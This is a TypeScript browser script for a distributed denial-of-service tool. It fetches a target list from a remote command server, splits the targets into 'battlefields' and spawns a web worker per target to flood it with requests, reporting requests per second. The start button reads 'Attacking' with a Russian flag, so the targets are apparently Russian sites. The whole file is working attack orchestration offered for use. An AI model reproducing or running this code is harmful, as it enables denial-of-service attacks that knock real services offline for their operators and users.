import './index.css'

const start = () => {
  const statusEl = document.getElementById('status') as HTMLDivElement

  function* getChunks<T = any>(arr: T[], n: number) {
    for (let i = 0; i < arr.length; i += n) {
      yield arr.slice(i, i + n);
    }
  }

  let count = 0
  let total = 0
  const onWorkerMessage = (ev: MessageEvent) => {
    count++
    total++
  }

  const start = async () => {
    const res = await fetch('https://srl.0x77.dev')
    let { targets, version } = await res.json() as { targets: string[]; version?: number }

    const battlefield = location.hash.length ? parseInt(location.hash.replace('#', '')) - 1 : new Date().getSeconds() % 4
    targets = [...getChunks(targets, Math.floor(targets.length/4))][battlefield]

    console.log(version, battlefield, targets)

    statusEl.innerHTML = `Battlefield: ${battlefield+1} <br/> Targets: ${targets.length}`

    setInterval(() => {
      statusEl.innerHTML = `Battlefield: ${battlefield+1} <br/> Targets: ${targets.length} <br/> ${count} requests/sec; total ${total} requests`
      count = 0
    }, 1000)

    const spawn = (target: string) => {
      const worker = new Worker(new URL('worker.ts', import.meta.url), { type: 'module' })
      worker.postMessage([{ target }])
      worker.onmessage = onWorkerMessage
    }

    for (const target of targets) {
      // Array(3).fill(target).forEach(spawn)
      spawn(target)
    }
  }

  start()
}

const startButton = document.getElementById('start') as HTMLLinkElement

startButton.onclick = () => {
  start()
  startButton.innerText = `Attacking 🇷🇺 💣`
  startButton.onclick = null
}

console.log(startButton)